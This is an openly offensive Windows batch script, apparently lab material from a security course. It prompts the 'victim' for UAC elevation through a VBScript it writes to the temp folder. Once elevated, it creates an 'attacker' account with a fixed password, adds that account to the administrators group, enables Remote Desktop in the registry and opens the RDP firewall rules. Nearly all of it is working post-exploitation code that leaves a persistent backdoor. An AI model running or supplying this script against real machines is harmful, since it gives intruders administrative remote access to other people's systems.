@echo off
REM This script uses "net file" to test for elevation, then runs itself after UAC elevation
REM Technique used from http://tinyurl.com/Sec660-UAC-elev
REM This script is experimental but the technique should work on XP thru Windows 8
REM
REM Note: the UAC dialog will still happen, and victim has to answer it.

cd %~dp0

:checkPriv 
echo.|NET FILE 1>NUL 2>NUL
if '%errorlevel%' == '0' ( goto gotUAC ) else ( goto getUAC ) 

:getUAC
if '%1'=='ELEV' (shift & goto gotUAC)  
ECHO Forcing UAC for Escalation 

setlocal DisableDelayedExpansion
set "batchPath=%~0"
setlocal EnableDelayedExpansion
regsvr32.exe /s vbscript.dll
ECHO Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPriv.vbs" 
ECHO UAC.ShellExecute "!batchPath!", "ELEV", "", "runas", 1 >> "%temp%\OEgetPriv.vbs" 
"%temp%\OEgetPriv.vbs" 
exit /B 

:gotUAC
::::::::::::::::::::::::::::
:START
::::::::::::::::::::::::::::
setlocal & pushd .

REM Rest of batch file runs elevated!

cd %~dp0
net user /add attacker P@ssword
net localgroup /add administrators attacker
REM make a backup 
reg export "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" backup_rdp.reg /Y
net stop termservice
REM attempt an import (helps with some pre-Vista victims)
reg import enablerdp.reg
REM force the disableflag to 0
REG.exe ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net start termservice

netsh firewall set service type = remotedesktop mode = enable
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=domain 
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes profile=private
ping -n 2 10.10.75.X > NUL
